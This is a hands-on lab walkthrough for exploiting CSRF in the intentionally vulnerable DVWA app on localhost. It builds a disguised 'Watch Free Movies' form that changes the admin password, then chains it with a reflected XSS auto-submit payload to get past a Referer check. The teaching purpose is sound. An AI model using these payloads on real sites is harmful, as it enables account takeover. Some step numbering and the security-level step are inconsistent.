# Cross-Site Request Forgery (CSRF)

Target - [Damn Vulnerable Web Application](https://github.com/digininja/DVWA)

```bash
docker run --platform linux/amd64 -d -p 4280:80 --name dvwa citizenstig/dvwa
```

## Understand the Basics

1. Run following commands:

    ```bash
    > git clone https://github.com/digininja/DVWA.git
    > cd DVWA
    > docker compose up -d
    ```

2. Navigate to http://localhost:4280
3. Click on "**Login**" button
4. In the "Database Setup" page, click on "**Create/Reset Database**" button
5. Login using the default admin credentials i.e., `admin`:`password`
6. Select "**DVWA Security**" in the main menu
7. In the "Security Level" page, select "**Low**" and click on "Submit" button. You should see the message `Security level set to low`.
8. Select "**CSRF**" in the main menu
9. Right click and select "View Page Source" from context menu
10. Do you see the "change password" **form**?

    ```html
    <form action="#" method="GET">
        New password:<br />
        <input type="password" AUTOCOMPLETE="off" name="password_new"><br />
        Confirm new password:<br />
        <input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
        <br />
        <input type="submit" value="Change" name="Change">

    </form>
    ```

9. Copy the form and paste it in a new file called "csrf.html"
10. Modify the value of "action" attribute from `#` to `http://localhost:4280/vulnerabilities/csrf/`
11. Add an H1 HTML element inside the `form` tag

    ```html
    <h1>Watch Free Movies</h1>
    ```
12. Replace `type="password"` with `type="hidden"`
13. Replace `value="Change"` with `value="Click here..."`
14. The contents of `csrf.html` file should look something similar to following:

    ```html
    <form action="http://localhost:4280/vulnerabilities/csrf/" method="GET">
        <h1>Watch Free Movies</h1>
        <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="123456"><br />
        <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="123456"><br />
        <input type="submit" value="Click here..." name="Change">
    </form> 
    ```

13. Host this malicious HTML file

    ```bash
    python3 -m http.server 1234
    ```

14. Navigate to http://127.0.0.1:1234/csrf.html
15. Test the admin credentials here - http://localhost:4280/vulnerabilities/csrf/test_credentials.php

## Chaining Vulnerabilities

1. Select "**DVWA Security**" in the main menu
2. In the "Security Level" page, select "**Low**" and click on "Submit" button. You should see the message `Security level set to medium`.
3. Select "**CSRF**" in the main menu
4. Re-host the "csrf.html" file created in previous exercise

    ```html
        <form action="http://localhost:4280/vulnerabilities/csrf/" method="GET">
        <h1>Watch Free Movies</h1>
        <input type="submit" value="Click here..." name="Change">
        <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="123456"><br />
        <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="123456"><br />
    </form> 
    ```

    ```bash
    python3 -m http.server 1234
    ```

5. Ensure that you are logged in to DVWA application
6. In a new tab, visit the `csrf.html`` page hosted at http://127.0.0.1:1234/csrf.html
7. Carelessly click on the "Click here..." button
8. Notice that the attack did not work this time. Why?
9. Click on `View Source` button on the bottom of CSRF challenge page at http://localhost:4280/vulnerabilities/csrf/
10. Analyze the code to understand what is triggering the following error message:

    ```html
    That request didn't look correct.
    ```
11. Notice the following lines of code:

    ```php
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ], $_SERVER[ 'SERVER_NAME' ]) !== false ) { 
    ...
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    } 
    ...
    ```

12. What does this mean? It means that any request from an external domain will be rejected. The attack must originate from within the application itself.
13. Go to http://localhost:4280/vulnerabilities/xss_r/
14. In the input box enter following values and observe the results

    ```text
    nullcon
    <script>alert(123)</script>
    <img src=x onerror=alert(456)>
    ```

15. Paste the following javascript payload in the input box:

    ```js
    <form id="csrf_form" action="http://localhost:4280/vulnerabilities/csrf/" method="GET">
        <input type="hidden" value="Change" name="Change">
        <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="123456"><br />
        <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="123456"><br />
    </form> 

    <script type="text/javascript">
        window.onload = function () {
        document.getElementById("csrf_form").submit();
        }
    </script>
    ```

16. View the page source and copy the new `form` element

    ```html
    <form name="XSS" action="#" method="GET">
        <p>
            What's your name?
            <input type="text" name="name">
            <input type="submit" value="Submit">
        </p>
    </form>
    ```

17. Create a new file called `csrf_auto.html` containing the modified form as follows:

    ```html
    <form name="XSS" action="http://localhost:4280/vulnerabilities/xss_r/" method="GET">
        <p>
            <h1>Watch Free Movies</h1>
            <input type="hidden" name="name" value="<form id='csrf_form' action='http://localhost:4280/vulnerabilities/csrf/' method='GET'>
                <input type='hidden' value='Change' name='Change'>
                <input type='hidden' AUTOCOMPLETE='off' name='password_new' value='123456'><br />
                <input type='hidden' AUTOCOMPLETE='off' name='password_conf' value='123456'><br />
            </form> 

            <script type='text/javascript'>
                window.onload = function () {
                document.getElementById('csrf_form').submit();
                }
            </script>">
            <input type="submit" value="Click here...">
        </p>
    </form>
    ```

18. Host this malicious HTML file

    ```bash
    python3 -m http.server 1234
    ```

19. Navigate to http://127.0.0.1:1234/csrf_auto.html
20. Test the admin credentials here - http://localhost:4280/vulnerabilities/csrf/test_credentials.php